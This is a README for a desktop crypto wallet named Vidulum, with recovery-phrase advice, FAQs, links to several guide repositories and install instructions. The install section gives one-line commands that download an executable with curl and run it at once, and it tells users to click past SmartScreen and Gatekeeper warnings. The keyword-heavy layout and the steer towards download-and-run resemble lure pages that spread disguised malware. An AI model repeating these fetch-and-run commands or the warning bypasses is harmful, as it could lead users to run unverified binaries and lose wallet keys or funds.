![Vidulum Wallet](assets/banner-profile.png)

# Vidulum

One multichain desktop wallet for people who would rather hold their own keys than trust a balance on someone else's screen.

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/blob/dev/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

> The account's wallet builds come from one repository. If a download here did not arrive from its releases page, treat it as unverified.

## What Vidulum does

Vidulum Wallet holds twenty networks under a single recovery phrase: four Cosmos chains, nine UTXO chains, six EVM chains and Solana mainnet. You install one desktop application for Windows, macOS or Linux, restore the phrase once, and the addresses for every supported chain are rebuilt from it.

Keys are generated and stored locally. Neither the project nor a support channel holds a copy, which is why a phrase can be restored but never reset, and why the phrase is the one thing worth protecting above everything else.

Around the application sit three written hubs. Setup and recovery covers installers, restore, keys, login and updates. Fixes and verification covers failed sends, chains that will not connect, balances that lag and build checks. Networks and rewards covers what the wallet holds, how the VDL reward programme is described, and what a reward term can and cannot promise.

The account also carries older repositories that are unrelated to the wallet: a trading GUI fork, a miner fork and a bot starter. They are left as they are and are not part of this product; nothing in these pages depends on them.

## How a desktop wallet differs from a hosted one

A hosted wallet shows you a balance it holds for you. A desktop wallet shows you a balance you hold, read from the chain through remote nodes. That difference decides almost everything else: who can move the funds, what happens when the service goes down, and what a support channel can and cannot do for you.

With Vidulum the keys are generated locally and stored with the application. The project holds no copy, so a support request cannot reset a wallet, reverse a send or restore a phrase. What support can do is help you read what the wallet is telling you, which is why the written guides carry most of the weight.

## What the recovery phrase does

One phrase derives addresses for all twenty supported networks. Restoring it into a fresh install rebuilds the same addresses in the same order, so the balances reappear without a transfer and without a fee.

The phrase is also the single point of failure. There is no account password behind it and nothing to reset, so anyone who reads it can move the funds, and anyone who loses it loses the route back. Keep it offline, in two independent places, and never type it into a page that is not the application's own restore screen.

## Four steps to a working wallet

First, download the installer that matches your platform and check it against the published hash. Second, install it and open the application on a machine you control. Third, restore your phrase - or create a new wallet if this is your first one - and confirm that the expected addresses appear. Fourth, send a small test amount to yourself before moving anything significant, so the address and the chain are proven before the balance is at stake.

## Guides by need

| Need | Repository | Start with |
| --- | --- | --- |
| Install it | <a href="https://github.com/vidulum-app/vidulum-wallet-guides">Vidulum Wallet setup and recovery guides</a> | <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a> |
| Bring a wallet back | <a href="https://github.com/vidulum-app/vidulum-wallet-guides">Vidulum Wallet setup and recovery guides</a> | <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> |
| Fix a failure | <a href="https://github.com/vidulum-app/vidulum-wallet-help">Vidulum Wallet fixes and verification guides</a> | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a> |
| Check coverage | <a href="https://github.com/vidulum-app/vidulum-wallet-staking">Vidulum Wallet networks and rewards guides</a> | <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a> |
| Understand rewards | <a href="https://github.com/vidulum-app/vidulum-wallet-staking">Vidulum Wallet networks and rewards guides</a> | <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-staking-rewards-vdl-programme.md">Vidulum VDL staking rewards programme</a> |

## Where to start

If the wallet is already installed, go to the guides hub and pick the page that matches your task. If it is not, start with the download, check the hash, and install before reading anything else.
## Popular questions

### Is this wallet safe to use?

Safety here is a routine rather than a verdict: the installer matches the published checksum, the phrase stays offline, and the destination address is read back before a send. The <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md">is the Vidulum Wallet safe to hold keys</a> sets out the four checks in order.

### Can I keep several chains in one wallet?

Yes. One phrase derives the addresses for all <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a>, and each chain keeps its own address format, so a send has to be aimed at the right one.

### What if a send fails?

Most failures come down to four causes: the fee coin is short, the destination format belongs to another chain, the chain is not reachable, or the balance has not been re-read. The <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a> walks the checks in order.

## Repositories

- <a href="https://github.com/vidulum-app/vidulum-wallet-desktop">vidulum-wallet-desktop</a> publishes the application, its three installers and the checksums for each release.
- <a href="https://github.com/vidulum-app/vidulum-wallet-guides">Vidulum Wallet setup and recovery guides</a> holds install, restore, key, login, update and fee guidance.
- <a href="https://github.com/vidulum-app/vidulum-wallet-help">Vidulum Wallet fixes and verification guides</a> holds failure diagnosis, chain reachability, balance checks, build verification and support channels.
- <a href="https://github.com/vidulum-app/vidulum-wallet-staking">Vidulum Wallet networks and rewards guides</a> holds network coverage, the reward programme description and desktop custody comparisons.

## About and license

The application is MIT licensed; the terms are in <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/blob/dev/LICENSE.md">the LICENSE file</a> of the main repository. Release v2.2.1 is on <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a>.

## How to install Vidulum Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip wallet.zip -d vidulum-linux`.
3. Make the extracted program executable: `chmod +x vidulum-linux/vidulum-wallet-desktop`.
4. Run it from that folder.
<!-- INSTALL-END -->